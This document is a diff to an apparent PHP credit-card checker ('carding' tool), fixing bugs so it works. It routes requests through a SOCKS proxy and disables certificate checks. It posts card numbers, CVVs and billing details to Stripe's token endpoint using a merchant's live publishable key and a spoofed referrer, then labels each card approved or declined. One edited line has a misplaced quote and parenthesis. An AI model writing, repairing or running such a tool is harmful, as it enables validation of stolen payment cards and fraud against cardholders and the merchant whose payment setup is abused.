@@ -72,8 +72,8 @@ $ch = curl_init();
 //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
 //////////======= Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, ' ');
-curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens)';
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: application/json',
@@ -90,12 +90,11 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS,
-   'card[name]='.$name.'+'.$last.'&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]=&card[address_zip]='.$postcode.'&card[address_country]=CA&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=cec9341b-2476-4232-b725-b8c315123dbda4c2bf&muid=382f34cb-fdb3-4c28-b932-a62461b439892fac2c&sid=20fa841c-28b3-4081-9a25-825b019c28aea741a9&payment_user_agent=stripe.js%2F125213ace%3B+stripe-js-v3%2F125213ace&time_on_page=33171&referrer=https%3A%2F%2Fhuntsvillefestival.ca%2F&key=pk_live_XctzvztiekWf9dJeEn5E7py8&_stripe_version=2020-03-02&pasted_fields=number');
-//
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]=&card[address_zip]='.$postcode.'&card[address_country]=CA&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=cec9341b-2476-4232-b725-b8c315123dbda4c2bf&muid=382f34cb-fdb3-4c28-b932-a62461b439892fac2c&sid=20fa841c-28b3-4081-9a25-825b019c28aea741a9&payment_user_agent=stripe.js%2F125213ace%3B+stripe-js-v3%2F125213ace&time_on_page=33171&referrer=https%3A%2F%2Fhuntsvillefestival.ca%2F&key=pk_live_XctzvztiekWf9dJeEn5E7py8&_stripe_version=2020-03-02&pasted_fields=number');  //
 
  $result = curl_exec($ch);
- $token = trim(strip_tags(getStr($result1,'"id": "','"')));
+ $token = trim(strip_tags(getStr($result,'"id": "','"')));     //
+
 
 
 //////2req 
@@ -268,16 +267,16 @@ elseif(strpos($result, 'Card is declined by your bank, please contact them for a
     echo '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dec Kart Bankanızla İletişime Geçin」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
 }
 elseif(strpos($result,"missing_payment_information")){
-     '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Payment Informations」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
+    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Payment Informations」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
 }
 elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
-     '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Kayıp Kart」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
+    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Kayıp Kart」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
 }
 else {
     echo '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Proxy Hatasi Yöneticiye Bildir」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.'  」 </span> </br>';
 }
 
-  curl_close($curl);
+  curl_close($ch);
   ob_flush();
   //////=========Comment Echo $result If U Want To Hide Site Side Response
   echo $result;
